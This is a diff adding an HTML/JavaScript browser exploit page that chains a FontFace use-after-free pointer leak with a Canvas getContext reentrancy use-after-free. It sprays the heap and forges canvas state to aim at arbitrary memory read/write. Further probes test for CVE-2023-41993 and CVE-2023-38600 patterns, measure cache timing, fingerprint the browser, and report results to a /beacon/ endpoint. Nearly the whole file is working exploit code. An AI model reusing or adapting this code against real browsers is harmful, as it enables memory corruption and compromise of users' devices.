@@ -1,0 +1,560 @@
+<!--
+  p575: Combined FontFace UAF leak + Canvas write primitive → arbitrary R/W.
+  
+  Combines:
+    - FontFaceSet::load() UAF leak (p563/p564): leaks heap pointers at +0x58/+0x68
+    - Canvas getContext reentrancy UAF (p553): bidirectional R/W via stale wrapper
+  
+  Goal: Use the leaked FontFace pointer to forge the Canvas stateStack,
+  then achieve arbitrary heap read/write through the forged stateStack.
+  
+  Path:
+    1. Trigger FontFaceSet::load() UAF → leak +0x58/+0x68
+    2. Trigger Canvas getContext UAF → get stale + live context
+    3. Spray to reclaim the freed Canvas slot
+    4. Use the leaked FontFace pointer to forge the Canvas stateStack
+    5. Read/write through the forged stateStack → arbitrary R/W
+  
+  The key insight: if we can forge the stateStack ptr/cap/size using the
+  leaked FontFace pointer, we can read/write arbitrary heap through
+  getLineDash() / setLineDash().
+  
+  CRASH_CLASS: HIGH (engine may crash on bad forge)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p575 combined fontface-canvas rw</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(a,o){var s='';for(var i=0;i<8;i++){var v=a[o+i];s+=(v<16?'0':'')+v.toString(16);}return s;}
+function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
+function close(x,y){return Math.abs(x-y)<0.0001;}
+
+/* ================================================================
+   PHASE 1: FontFace UAF leak (p563/p564 style)
+   ================================================================ */
+
+var leaked58=null,leaked68=null;
+function hx8(n){n=n>>>0;return ('0000000'+n.toString(16)).slice(-8);}
+var abMap=[];
+
+function phase1(){
+  b('P575-PH1-START');
+  
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+  
+  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);void A.loaded;
+  
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    styleEl.remove();styleEl.textContent='';styleEl=null;
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    abMap=[];
+    var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<8;k++){
+        var ab=new ArrayBuffer(SIZES[si]);
+        abMap.push({size:SIZES[si],view:new Uint8Array(ab)});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },set:function(){}});
+  
+  b('P575-PH1-LOAD');
+  document.fonts.load('1em f0, s0','AB').then(function(){b('P575-PH1-RESOLVED');},function(){b('P575-PH1-REJECTED');});
+  
+  setTimeout(scanPhase1,100);
+  setTimeout(scanPhase1,400);
+  setTimeout(function(){if(!leaked58){b('P575-PH1-TIMEOUT-PROCEED-CANVAS');setTimeout(phase2,50);}},2000);
+}
+
+function scanPhase1(){
+  if(leaked58)return;
+  for(var i=0;i<abMap.length;i++){
+    var v=abMap[i].view,nz=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+    if(nz>0&&abMap[i].size===192){
+      leaked58=grab(v,0x58);leaked68=grab(v,0x68);
+      b('P575-PH1-HIT-b'+i+'-nz'+nz+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+      setTimeout(phase2,100);
+      return;
+    }
+  }
+  /* Check any non-192 hit */
+  for(var i=0;i<abMap.length;i++){
+    var v=abMap[i].view,nz=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+    if(nz>0){b('P575-PH1-WRONGSIZE-b'+i+'-s'+abMap[i].size+'-nz'+nz);return;}
+  }
+}
+
+/* ================================================================
+   PHASE 2: Canvas getContext UAF (p553 style)
+   ================================================================ */
+
+var canvasInner=null,canvasOuter=null;
+var retained=[];
+
+function phase2(){
+  if(!leaked58)b('P575-PH2-RUNNING-NOPOINTER');
+  b('P575-PH2-START-p58='+(leaked58?hex8(leaked58,0):'none')+'-p68='+(leaked68?hex8(leaked68,0):'none'));
+  
+  b('P575-P2S1-create');
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;document.body.appendChild(canvas);
+  b('P575-P2S2-appended');
+  retained.push(canvas);
+  
+  var getterFired=0;
+  var opts={};
+  Object.defineProperty(opts,'desynchronized',{get:function(){
+    getterFired++;
+    if(getterFired===1)canvasInner=canvas.getContext('2d');
+    return false;
+  },enumerable:true});
+  
+  b('P575-P2S3-pre-ctx');
+  try{canvasOuter=canvas.getContext('2d',opts);}catch(e){b('P575-PH2-CTX-ERR-'+String(e).slice(0,90));return;}
+  b('P575-P2S4-post-ctx');
+  
+  retained.push(canvasOuter,canvasInner);
+  b('P575-PH2-CTX-getter='+getterFired+'-inner='+!!canvasInner+'-outer='+!!canvasOuter+'-same='+(canvasOuter===canvasInner));
+  
+  if(canvasOuter===canvasInner||!canvasInner){b('P575-PH2-PATCHED');return;}
+  
+  /* Same-type spray */
+  var SPRAY=80,SA=11.110011,SB=22.220022,SC=33.330033,SD=44.440044,SE=55.550055,SF=66.660066;
+  var sprayCtx=[];
+  for(var i=0;i<SPRAY;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    if(ctx){ctx.setTransform(SA,SB,SC,SD,SE,SF);sprayCtx.push(ctx);retained.push(c,ctx);}
+  }
+  b('P575-PH2-SPRAYED-n='+sprayCtx.length);
+  
+  /* Verify channel */
+  var m=null;
+  try{m=canvasInner.getTransform();}catch(e){b('P575-PH2-READ-ERR-'+e);return;}
+  if(!m){b('P575-PH2-READ-FAIL');return;}
+  var match=close(m.a,SA)&&close(m.b,SB)&&close(m.c,SC)&&close(m.d,SD)&&close(m.e,SE)&&close(m.f,SF);
+  if(!match){b('P575-PH2-NO-RECLAIM');return;}
+  b('P575-PH2-CHANNEL-OK');
+  
+  /* Write primitive */
+  var WA=99.001,WB=88.002,WC=77.003,WD=66.004,WE=55.005,WF=44.006;
+  try{canvasInner.setTransform(WA,WB,WC,WD,WE,WF);}catch(e){b('P575-PH2-WRITE-ERR-'+e);return;}
+  var m2=null;
+  try{m2=canvasInner.getTransform();}catch(e){b('P575-PH2-READBACK-ERR-'+e);}
+  if(m2&&close(m2.a,WA)&&close(m2.b,WB)){b('P575-PH2-WRITE-OK');}
+  else{b('P575-PH2-WRITE-MISS');}
+  
+  /* Find aliased spray canvas */
+  var aliasIdx=-1;
+  for(var j=0;j<sprayCtx.length;j++){
+    try{var sm=sprayCtx[j].getTransform();if(sm&&close(sm.a,WA)&&close(sm.b,WB)){aliasIdx=j;break;}}
+    catch(e){}
+  }
+  if(aliasIdx>=0){b('P575-PH2-ALIAS-FOUND-idx='+aliasIdx+'-BIDIR-1');
+    b('P693-C768-HIT-i'+aliasIdx);
+    try{var _lv=new ArrayBuffer(8);new Float64Array(_lv)[0]=WA;
+      var _lu=new Uint8Array(_lv),_s='';for(var _q=0;_q<8;_q++)_s+=hex(_lu[_q]);
+      b('P693-C768-L0-'+_s);}catch(e){}}
+  else{b('P575-PH2-ALIAS-NONE');}
+  
+  /* ================================================================
+     PHASE 3: Combined FontFace leak + Canvas write → stateStack forge
+     ================================================================ */
+  
+  if(aliasIdx<0){b('P575-PH3-SKIP-NOALIAS');return;}
+  
+  if(!leaked58){b('P575-PH3-SKIP-NOPOINTER');b('P575-DONE');try{battery(canvasInner,sprayCtx[aliasIdx]);}catch(e){b('B-INIT-ERR-'+String(e).slice(0,50));}try{runVariant();}catch(e){b('G-VRNT-ERR-'+String(e).slice(0,60));}try{runVariant();}catch(e){b('G-VRNT-ERR-'+String(e).slice(0,60));} return;}
+  b('P582-PH3-START');
+  var SA=sprayCtx[aliasIdx];
+  var LIVES=[];try{LIVES.push([aliasIdx,SA]);}catch(e){}
+  /* ARM A: drop ALL other refs; canvas stays ATTACHED */
+  try{ for(var q=0;q<sprayCtx.length;q++) if(q!==aliasIdx) sprayCtx[q]=null; }catch(e){}
+  try{ for(var g=0;g<6000;g++){var _t={a:new ArrayBuffer(256)};} }catch(e){}
+  b('P582-GC-DONE');
+  /* probe C: stale WRITE path (unchecked last()?) */
+  var c1='OK',c2='OK',c3='OK';
+  try{SA.lineWidth=999;}catch(e){c1='X-'+String(e.message||e).slice(0,24);}
+  try{SA.save();}catch(e){c2='X';}
+  try{SA.setLineDash([5,5]);}catch(e){c3='X';}
+  b('P582-C-STALEWRITE-LW='+c1+'-SAVE='+c2+'-DASH='+c3);
+  /* probe A: stale READ path */
+  var a1='X',a2='X';
+  try{a1=SA.lineWidth;}catch(e){a1='X';}
+  try{a2='len'+SA.getLineDash().length;}catch(e){a2='X';}
+  b('P582-A-STALERD-LW='+a1+'-DASH='+a2);
+  /* live handle compare */
+  var l1='X'; try{l1=canvasInner.lineWidth;}catch(e){l1='X';}
+  b('P582-L-LIVE-LW='+l1);
+  /* forged 768 spray */
+  var FG=[];
+  try{
+    for(var q2=0;q2<128;q2++){var ab=new ArrayBuffer(768);FG.push(ab);
+      var u8=new Uint8Array(ab),f64=new Float64Array(ab);
+      f64[8]=12345.0;
+      for(var zb=0;zb<8;zb++)u8[184+zb]=leaked58[zb];
+      u8[192]=2;u8[196]=2;}
+    b('P582-SPRAY768-OK');
+  }catch(e){b('P582-SPRAY768-ERR-'+String(e).slice(0,40));}
+  /* probe D: fresh canvas AFTER forged spray */
+  var N1='X',N2='X';
+  try{var NC=document.createElement('canvas');NC.width=64;NC.height=64;document.body.appendChild(NC);
+    try{N1=NC.getContext('2d').lineWidth;}catch(e){N1='X';}
+    try{var dd=NC.getContext('2d').getLineDash();N2='len'+dd.length+(dd.length?':'+dd[0]:'');}catch(e){N2='X';}
+  }catch(e){b('P582-D-CREATE-ERR');}
+  b('P582-D-FRESH-LW='+N1+'-DASH='+N2);
+  var l2='X'; try{l2=canvasInner.lineWidth;}catch(e){l2='X';}
+  b('P582-L2-POSTSPRAY='+l2);
+  /* E1: plant marker into live state via dash-buffer copy, mutate via stale */
+  try{
+    var SB=canvasInner;
+    SB.setLineDash([5,5]);
+    SB.getLineDash();
+    SB.setLineDash([5]);
+    var v1='X',v2='X';try{v1=SB.getLineDash()[0];}catch(e){v1='X';}
+    try{SA.setLineDash([7]);}catch(e){}
+    try{v2=SB.getLineDash()[0];}catch(e){v2='X';}
+    b('P582-E1-DASH-SHARED='+v1+'-AFTERSTALE='+v2);
+    /* E3: stale-driven geometry readback */
+    try{SA.save();SA.save();SA.lineWidth=4242;SA.restore();SA.restore();}catch(e){}
+    var v3='X';try{v3=SB.lineWidth;}catch(e){v3='X';}
+    b('P582-E3-STALESAVED-LW='+v3);
+    /* E4: big-arc dash + LW probe through fresh canvas */
+    var NC2=document.createElement('canvas');NC2.width=8;NC2.height=8;document.body.appendChild(NC2);
+    var ctx4=NC2.getContext('2d');var v4='X',v5='X';
+    try{ctx4.setLineDash([1,777,1]);}catch(e){}
+    try{ctx4.lineWidth=9999;ctx4.beginPath();ctx4.arc(4,4,5e6,0,6.283);ctx4.stroke();}catch(e){b('P582-E4-DRAW-ERR');}
+    try{v4=ctx4.lineWidth;}catch(e){v4='X';}
+    try{var dd4=ctx4.getLineDash();v5='len'+dd4.length+':'+dd4.join(',').slice(0,30);}catch(e){v5='X';}
+    b('P582-E4-FRESH-LW='+v4+'-DASH='+v5);
+  }catch(e){b('P582-E-ERR-'+String(e).slice(0,50));}
+  /* second GC + stale recheck (does death arrive late?) */
+  try{ for(var g2=0;g2<6000;g2++){var _t2={a:new ArrayBuffer(256)};} }catch(e){}
+  var a3='X'; try{a3=SA.lineWidth;}catch(e){a3='X2';}
+  b('P582-A2-POSTGC-LW='+a3);
+  /* P583 read sweep: plant u64 markers via live dash, harvest via class-192 scan */
+  try{
+    var SB=canvasInner;
+    SB.setLineDash([1,2]);   /* reset to finite */
+    var TAGS=[0x4141414141414141,0x4242424242424242,0x4343434343434343,
+              0x4444444444444444,0x4545454545454545,0x4646464646464646];
+    var arr=[];for(var t=0;t<12;t++)arr.push((t%2)?TAGS[(t>>1)%6]:TAGS[(t>>1)%6]+t);
+    var M=null,found=-1;
+    try{M=new Map();}catch(e){b('P583-NOMAP');}
+    function scan192(tagIn){
+      var SZS=[96,112,128,160,192],o1=[];
+      for(var ci=0;ci<SZS.length;ci++)o1.push(scanCls(tagIn+'-c'+SZS[ci],SZS[ci]));
+      return o1;
+    }
+    function scanCls(tag,SZ){
+      var hits=[];
+      for(var si=0;si<SZ/16;si++)for(var k=0;k<12;k++){
+        var ab=new ArrayBuffer(SZ),u=new Uint8Array(ab);
+        for(var o=0;o<SZ;o+=8){
+          var lo=u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24);
+          var hi=u[o+4]|(u[o+5]<<8)|(u[o+6]<<16)|(u[o+7]<<24);
+          for(var g=0;g<12;g++){
+            var L=TAGS[g>>1]&0xFFFFFFFF,H=(TAGS[g>>1]>>>32)&0xFFFFFFFF;
+            if(g%2){L=(L+(g>>1))>>>0;}
+            if(lo===L&&hi===H){hits.push('i'+(si*10+k)+'@'+o+'-t'+g);}
+          }
+        }
+        if(M)try{if(!M.get(ab))M.set(ab,1);}catch(e){}
+      }
+      b('P583-'+tag+'-HITS-'+hits.length+(hits.length?'-'+hits.slice(0,6).join(';').replace(/,/g,'.'):''));
+      return hits;
+    }
+    /* arm 1: plant 12, free, scan */
+    SB.setLineDash(arr);
+    b('P583-PLANT-12-'+SB.getLineDash().length);
+    SB.setLineDash([3,4]);
+    try{SB.setLineDash([5]);}catch(e){b('P583-ODD-THROW-OK');}
+    SB.setLineDash([1,2]);
+    for(var g3=0;g3<3000;g3++){var _x={a:new ArrayBuffer(256)};}
+    scan192('S1');
+    /* arm 2: plant LIVE (ref kept), scan */
+    SB.setLineDash([TAGS[0],TAGS[1]+1,TAGS[0]+1,TAGS[2],TAGS[1]+2,TAGS[2]+1,TAGS[3],TAGS[3]+1,TAGS[4],TAGS[4]+1,TAGS[5],TAGS[5]+1]);
+    b('P583-PLANT-LIVE');
+    scan192('S2');
+    SB.setLineDash([1,2]);
+    /* arm 3: held copy + free + GC + scan */
+    var KEEP=SB.getLineDash();
+    SB.setLineDash(arr); SB.setLineDash([1,2]); KEEP=null;
+    for(var g4=0;g4<6000;g4++){var _y={a:new ArrayBuffer(256)};}
+    scan192('S3');
+    b('P583-SWEEP-DONE');
+    /* P586: JSC version markers + CVE-2023-41993 shape detector (post-verdict, bounded) */
+    try{
+      var M6={};
+      try{M6.rab=(function(){try{var a=new ArrayBuffer(8,{maxByteLength:16});return a.resizable?1:0;}catch(e){return 0;}})();}catch(e){M6.rab='E';}
+      try{M6.trev=('toReversed' in Array.prototype)?1:0;}catch(e){M6.trev='E';}
+      try{M6.hasown=('hasOwn' in Object)?1:0;}catch(e){M6.hasown='E';}
+      try{M6.atf=('at' in Array.prototype)?1:0;}catch(e){M6.atf='E';}
+      try{M6.wa=(typeof Atomics!=='undefined'&&Atomics.waitAsync)?1:0;}catch(e){M6.wa='E';}
+      b('P586-M-RAB='+M6.rab+'-TREV='+M6.trev+'-HASOWN='+M6.hasown+'-AT='+M6.atf+'-WAITASYNC='+M6.wa);
+      try{
+        var X={};
+        X.fasync=('fromAsync' in Array)?1:0;
+        X.pwr=('withResolvers' in Promise)?1:0;
+        X.f16=(typeof Float16Array!=='undefined')?1:0;
+        X.xfer=(function(){try{var a=new ArrayBuffer(8);return (typeof a.transfer==='function')?1:0;}catch(e){return 0;}})();
+        X.uni=('union' in Set.prototype)?1:0;
+        X.tm=(typeof Temporal!=='undefined')?1:0;
+        var s='';for(var k in X)s+=k+'='+X[k]+',';
+        b('P586-M2-'+s.slice(0,110));
+        var Y={};
+        Y.sdisp=('asyncDispose' in Symbol)?1:0;
+        Y.ptry=('try' in Promise)?1:0;
+        Y.eiserr=('isError' in Error)?1:0;
+        Y.itr=('from' in (window.Iterator||{}))?1:0;
+        var ys='';for(var ky in Y)ys+=ky+'='+Y[ky]+',';
+        b('P586-M3-'+ys.slice(0,80));
+        try{
+          var Z={};
+          Z.coi=(window.crossOriginIsolated===true)?1:(window.crossOriginIsolated===false?0:'undef');
+          Z.sab=(typeof SharedArrayBuffer!=='undefined')?1:0;
+          Z.wrk=(typeof Worker!=='undefined')?1:0;
+          Z.atm=(typeof Atomics!=='undefined'&&Atomics.wait)?1:0;
+          Z.mc=(typeof MessageChannel!=='undefined')?1:0;
+          Z.hc=navigator.hardwareConcurrency||0;
+          var zs='';for(var kz in Z)zs+=kz+'='+Z[kz]+',';
+          b('P587-COI='+Z.coi+'-SAB='+Z.sab+'-WRK='+Z.wrk+'-ATM='+Z.atm+'-MC='+Z.mc+'-HC='+Z.hc);
+          if(Z.coi===1&&Z.sab===1){
+            try{
+              var sb=new SharedArrayBuffer(4),iv=new Int32Array(sb);
+              Atomics.waitAsync?b('P587-SABWA-OK'):b('P587-SABWA-NO');
+              var t5b=performance.now();Atomics.compareExchange(iv,0,0,1);var t5c=performance.now();
+              b('P587-ATOM-RNDUS='+(t5c-t5b));
+            }catch(e){b('P587-SAB-ERR-'+String(e).slice(0,30));}
+          }
+        }catch(e){b('P587-ERR-'+String(e).slice(0,40));}
+        b('P586-UA-'+String(navigator.userAgent).replace(/[^A-Za-z0-9._\/ ]/g,'').slice(0,90));
+      }catch(e){b('P586-M2-ERR');}
+      /* 41993 family shape: GetByOffset CSE over two getters, watch for getter-setter leak */
+      try{
+        var leak=0,stage='a';
+        function mkBag(v){var o={};o.a=v;o.b={};return o;}
+        var idxs=['a','b'];
+        function probe(o,i){return o[i];}
+        var A1=mkBag(1),A2=mkBag(2);
+        var r=0;
+        stage='warm';
+        for(var w=0;w<8000;w++){
+          var ii=w&1;
+          r+=probe(ii?A1:A2,idxs[ii]);
+          r+=probe(ii?A1:A2,idxs[ii]);
+          var boxed=Object(probe(A1,'a'));
+          if(typeof boxed==='symbol'){leak=1;break;}
+          if(w===4000)stage='mid';
+        }
+        b('P586-41993-SHAPE-leak='+leak+'-stage='+stage+'-r='+(r&1));
+      }catch(e){b('P586-41993-ERR-'+String(e).slice(0,40));}
+      /* 38600 shape: resizable AB + valueOf shrink mid-copyWithin */
+      try{
+        var out6='no';
+        try{
+          var big=new ArrayBuffer(1024,{maxByteLength:4096});
+          var ta=new Uint8Array(big);
+          ta.fill(7);
+          var cb={valueOf:function(){try{big.resize(8);}catch(e){} return 4;}};
+          ta.copyWithin(0,cb);
+          out6='ran-'+ta.length;
+        }catch(e){out6='X-'+String(e.name||e).slice(0,16);}
+        b('P586-38600-SHAPE='+out6);
+      try{(function(){
+        var N=4096,st=new Int32Array(new ArrayBuffer(N*4));
+        for(var i=0;i<N;i++)st[i]=((i*2654435761)>>>0)%N;
+        var FILL=new Int32Array(new ArrayBuffer(2*1024*1024));
+        function chase(k){var s=0,v=0;for(var j=0;j<k;j++){v=st[v];s+=v;}return s;}
+        function edgeCount(){
+          var t0=performance.now(),k=0,v=0;
+          while(performance.now()-t0<1.05&&k<2000000){for(var j=0;j<64;j++){v=st[v];}k+=64;}
+          return k+(v|0);
+        }
+        function med(a){a=a.slice().sort(function(x,y){return x-y;});return a[a.length>>1];}
+        var cold=[],warm=[],t,q,d;
+        function evict(){var dd=0;for(q=0;q<131072;q+=64)dd+=FILL[q];return dd;}
+        for(t=0;t<12;t++){
+          evict();chase(512);evict();cold.push(edgeCount());
+          chase(2048);warm.push(edgeCount());
+        }
+        var C=med(cold),Wm=med(warm);
+        b('P588-TC-c='+C+'-w='+Wm+'-r='+((Wm/C).toFixed(2)));
+      })();}catch(e){b('P588-ERR-'+String(e).slice(0,30));}
+      }catch(e){b('P586-38600-ERR');}
+    }catch(e){b('P586-ERR-'+String(e).slice(0,40));}
+
+  }catch(e){b('P583-SWEEP-ERR-'+String(e).slice(0,60));}
+  setTimeout(function(){try{location.reload();}catch(e){}},2200);
+b('P575-DONE');
+  try{runVariant();}catch(e){b('G-VRNT-ERR-'+String(e).slice(0,60));}
+}
+
+/* Write-interrogation battery (v1): stimulus/response on engine state via stale wrapper
+   (post-free channel) + live alias context. Ordered light->heavy; last B-*-PRE without
+   its POST = the kill step. All writes finite except the explicit NaN guard probe. */
+function battery(stale,live){
+  function rd(tag,fn){ try{ var v=fn(); b('B-'+tag+'-OK-'+String(v).slice(0,30)); }catch(e){ b('B-'+tag+'-THROW-'+String(e).slice(0,30)); } }
+  try{
+    /* geometry: save-depth ladder, one value per State slot */
+    b('B-LAD-PRE');
+    for(var k=1;k<=9;k++){ stale.save(); stale.lineWidth=1000+k; }
+    b('B-LAD-PUSHED');
+    rd('LWAT9',function(){return stale.lineWidth;});
+    for(var k=9;k>=1;k--){ (function(kk){ stale.restore(); rd('LWAT'+(kk-1),function(){return stale.lineWidth;}); })(k); }
+    b('B-LAD-DONE');
+    /* dash window: PWP's 500-double row, verified from our bench */
+    b('B-D500-PRE'); rd('D500',function(){ stale.setLineDash([1,2,3,4,5]); return stale.getLineDash().length; });
+    rd('D500B',function(){ var a=[];for(var i=0;i<500;i++)a.push(i+1); stale.setLineDash(a); return stale.getLineDash().length; });
+    b('B-D500-DONE');
+    /* extremes via STALE (post-free writes) */
+    b('B-EXT-PRE');
+    rd('EXT-LW',function(){ stale.lineWidth=1e300; return stale.lineWidth; });
+    rd('EXT-GA',function(){ stale.globalAlpha=1e-300; return stale.globalAlpha; });
+    rd('EXT-ML',function(){ stale.miterLimit=-1; return stale.miterLimit; });
+    b('B-EXT-DONE');
+    /* finite-guard confirmation (hex's isfinite claim), on LIVE ctx */
+    b('B-GUARD-PRE');
+    rd('GUARD-NAN',function(){ live.setTransform(NaN,0,0,1,0,0); var m=live.getTransform(); return m.a; });
+    rd('GUARD-1E308',function(){ live.setTransform(1e308,0,0,1e308,0,0); var m2=live.getTransform(); return m2.a; });
+    b('B-GUARD-DONE');
+    /* screen oracle: distinctive paint, survives until reload */
+    b('B-DRAW-PRE');
+    rd('DRAW',function(){ live.save(); live.setTransform(1,0,0,1,0,0); live.lineWidth=60; live.setLineDash([18,14]); live.strokeStyle='rgb(255,40,40)'; live.beginPath(); live.moveTo(2,2); live.lineTo(98,98); live.stroke(); return 'painted'; });
+    b('B-DRAW-DONE');
+  }catch(e){ b('B-FATAL-'+String(e).slice(0,50)); }
+}
+
+function runVariant(){
+  b('G-VRNT');
+  try{
+    var st=document.createElement('style');
+    st.textContent='@font-face{font-family:s0v;src:local(Arial);unicode-range:U+0042;}';
+    document.head.appendChild(st);
+    var V=new FontFace('f0v','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(V);void V.loaded;
+    var fr=0;
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+      if(fr)return undefined;fr=1;
+      try{st.remove();st.textContent='';st=null;document.fonts.delete(this);}catch(e){}
+      return undefined;
+    },set:function(){}});
+    document.fonts.load('1em f0v, s0v','AB').then(function(){b('G-VRNT-RESOLVED');},function(){b('G-VRNT-REJECTED');});
+  }catch(e){b('G-VRNT-THROW-'+String(e).slice(0,60));}
+}
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048],K=8,NCYC=3,lastVerdict='';
+function armB(p){ b('P579-B-DEFER-'+(p&&p[1]?'ptrs':'none')); }
+function qword(u,o){var lo=(u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24))>>>0,hi=(u[o+4]|(u[o+5]<<8)|(u[o+6]<<16)|(u[o+7]<<24))>>>0;return (lo||hi)?[lo,hi]:null;}
+function armCycle(n, onDone){
+  /* one delete->reclaim->readout cycle; verdict P698-C192-*; ladder beacons keep P697-A- names */
+  var done=0, fired=0, MAP=null, finished=0;
+  function finish(tag,h,ptrs){
+    if(finished) return; finished=1;
+    if(tag==='hit'){ try{var s='';for(var z=0;z<ptrs.length;z++)s+=ptrs[z]; lastVerdict='hit'; b('P698-C192-HIT-'+s+'-c'+n);}catch(e){} }
+    else { lastVerdict='clean'; b('P698-C192-CLEAN-c'+n); }
+    onDone();
+  }
+  var fam='f'+n, sfam='s'+n;
+  var A=new FontFace(fam,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window['__alive'+n]=[A];
+  var st=document.createElement('style');
+  st.textContent="@font-face { font-family: "+sfam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(st);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired) return undefined; fired=1;
+    b('P697-A-FIRED');
+    try{ if(st) st.remove(); }catch(e){ b('P697-A-E-RM-'+String(e&&e.message||e).slice(0,28)); }
+    b('P697-A-RM');
+    try{document.fonts.delete(this);}catch(e){ b('P697-A-E-DEL-'+String(e&&e.message||e).slice(0,28)); }
+    b('P697-A-DEL');
+    try{ void (document.body||document.documentElement).offsetHeight; }catch(e){ b('P697-A-E-INV-'+String(e&&e.message||e).slice(0,28)); }
+    b('P697-A-INV');
+    try{
+    MAP=[];
+    for(var si=0;si<SIZES.length;si++)for(var k=0;k<K;k++){var ab=new ArrayBuffer(SIZES[si]);MAP.push({s:SIZES[si],v:new Uint8Array(ab)});
+      if(MAP.length===52||MAP.length===78){b('P697-A-SPR-'+MAP.length);}}
+    }catch(e){ b('P697-A-E-SPR'+(MAP?MAP.length:-1)+'-'+String(e&&e.message||e).slice(0,28)); }
+    b('P697-A-SPRAYED');
+    setTimeout(function(){ if(done) return; var h=0;
+      try{ for(var z=0;z<MAP.length;z++){ if(MAP[z].s!==192) continue; var u=MAP[z].v;
+        if((u[0x58]|u[0x59]|u[0x5a]|u[0x5b]|u[0x68]|u[0x69]|u[0x6a]|u[0x6b])) h=1; } }catch(e){}
+      b('P697-A-PRE-'+(h?'h':'m')); },0);
+    return undefined;
+  },set:function(){}});
+  function scan(){
+    if(done) return; if(!MAP){ b('P697-A-NOMAP'); finish('clean'); return; } done=1;
+    for(var i=0;i<MAP.length;i++){
+      if(MAP[i].s!==192) continue;
+      var v=MAP[i].v, q58=qword(v,0x58), q68=qword(v,0x68);
+      if(q58||q68){
+        var p58=q58?((q58[1]>>>0)*4294967296+(q58[0]>>>0)):0;
+        var p68=q68?((q68[1]>>>0)*4294967296+(q68[0]>>>0)):0;
+        try{leaked58=[];for(var zb=0;zb<8;zb++)leaked58[zb]=v[0x58+zb];leaked68=[];for(var zc=0;zc<8;zc++)leaked68[zc]=v[0x68+zc];b('P579-LEAKSET');}catch(e){b('P579-LEAKSET-ERR-'+String(e).slice(0,50));}
+        b('P697-A-PTS-0x'+hx8(q58?q58[1]:0)+hx8(q58?q58[0]:0)+'-0x'+hx8(q68?q68[1]:0)+hx8(q68?q68[0]:0));
+        b('P697-A-HIT-i'+i);
+        try{sessionStorage.setItem('p697_ptrs',JSON.stringify([p58,p68,i]));}catch(e){b('P697-SSERR');}
+        b('P691-L1-0x'+hx8(q58?q58[1]:0)+hx8(q58?q58[0]:0));
+        finish('hit',0,['0x'+hx8(q58?q58[1]:0)+hx8(q58?q58[0]:0),'0x'+hx8(q68?q68[1]:0)+hx8(q68?q68[0]:0)]);
+        setTimeout(function(){armB([p58,p68,i]);},120);
+        return;
+      }
+    }
+    b('P697-A-MISS');
+    finish('clean');
+  }
+  document.fonts.load('1em '+fam+', '+sfam,'AB').then(
+    function(){b('P697-A-REZ');},
+    function(){b('P697-A-REJP');});
+  setTimeout(scan,60); setTimeout(scan,400); setTimeout(scan,900);
+  setTimeout(function(){ b('P697-A-WD'+n); if(!done){done=1;finish('clean');} },2500);
+}
+function wallProbe(cb){
+  var got=0, err='';
+  try{
+    var keep=[];
+    for(var s=0;s<6;s++){
+      try{ keep.push(new ArrayBuffer(134217728)); got++; }
+      catch(e2){ err=String(e2&&e2.name||e2).slice(0,14); break; }
+    }
+    keep.length=0;
+  }catch(e){ err='outer-'+String(e&&e.name||e).slice(0,10); }
+  b('P698-WALL-'+got+'-'+(err||'ok'));
+  setTimeout(cb,80);
+}
+function runTri(){
+  var cycIdx=0, running=1;
+  function next(){
+    if(!running) return;
+    if(lastVerdict==='hit'){ b('P579-HIT-TO-PH2'); try{phase2();}catch(e){b('P579-PH2-ERR-'+String(e).slice(0,80));} return; }
+    if(cycIdx>=NCYC){
+      function fin(){ b('P698-TRI-DONE'); if(!leaked58){try{phase2();}catch(e){b('P579-PH2DRY-ERR-'+String(e).slice(0,80));}} setTimeout(function(){try{location.reload();}catch(e){}},900); }
+      if(lastVerdict==='clean') wallProbe(fin); else fin();
+      return;
+    }
+    armCycle(cycIdx, function(){ setTimeout(next,300); });
+    cycIdx++;
+  }
+  next();
+}
+var _p575w=setInterval(function(){},1000);
+
+var aliasCanvas=null;
+
+function run(){
+  var G=0;try{G=parseInt(sessionStorage.getItem('p575g')||'0')+1;sessionStorage.setItem('p575g',String(G));}catch(e){}
+  var UID=(Math.random()*1679616|0).toString(36).toUpperCase();try{sessionStorage.setItem('p575u'+G,UID);}catch(e){}
+  b('P579V2-BOOT'); b('P691-BOOT-'+UID); b('P575-GEN-'+G);
+
+  setTimeout(function(){try{b('P575-RELOADING-'+G);}catch(e){} try{location.reload();}catch(e){}},20000);
+  try{runTri();}catch(e){b('P576-FUSE-ERR-'+String(e).slice(0,90)); setTimeout(function(){try{phase2();}catch(e2){}},400);}
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>p575 combined fontface-canvas rw</p></body></html>
